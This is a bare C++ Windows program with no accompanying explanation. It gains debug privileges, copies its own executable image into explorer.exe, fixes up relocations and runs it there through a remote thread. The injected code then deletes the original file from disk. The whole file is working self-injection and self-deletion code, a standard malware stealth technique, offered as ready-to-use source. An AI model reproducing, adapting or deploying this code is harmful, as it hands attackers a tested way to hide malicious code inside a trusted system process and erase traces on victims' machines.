#include <cstdio>
#include <Windows.h>
#include <tlhelp32.h>

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type   :  4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

// Variable in which the main file is stored.
WCHAR moduleName[128] = L"";

DWORD InjectionEntryPoint() {
    // To delete a file, you must let it stand for a little time before deleting it.
    Sleep(1000);

    DeleteFileW(moduleName);
    return 0;
}

DWORD GetProcessId(const wchar_t *ProcessName) {
    PROCESSENTRY32W pe32;
    HANDLE hSnapshot = NULL;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (!wcscmp(pe32.szExeFile, ProcessName)) break;
        } while(Process32NextW(hSnapshot, &pe32));
    }

    if (hSnapshot != INVALID_HANDLE_VALUE) CloseHandle(hSnapshot);

    return pe32.th32ProcessID;
}

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) return FALSE;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege) tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else tp.Privileges[0].Attributes = 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL)) return FALSE;

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) return FALSE;

    return TRUE;
}

BOOL GetDebugPrivileges() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) return FALSE;
    if (!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE)) return FALSE;
    return TRUE;
}

int main() {
    GetDebugPrivileges();

    DWORD ProcessId = GetProcessId(L"explorer.exe");

    // Get Current PE File name.
    GetModuleFileNameW(NULL, moduleName, sizeof(moduleName));

    PVOID imageBase = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);
    PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
    memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);
    HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, ProcessId);

    PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;
    PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    DWORD relocationEntriesCount = 0;
    PDWORD_PTR patchedAddress;
    PBASE_RELOCATION_ENTRY relocationRVA = NULL;
    while (relocationTable->SizeOfBlock > 0) {
        relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);
        for (DWORD i = 0; i < relocationEntriesCount; i++) {
            if (relocationRVA[i].Offset) {
                patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
                *patchedAddress += deltaImageBase;
            }
        }
        relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
    }

    WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL);
    CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + deltaImageBase), NULL, 0, NULL);

    return 0;
}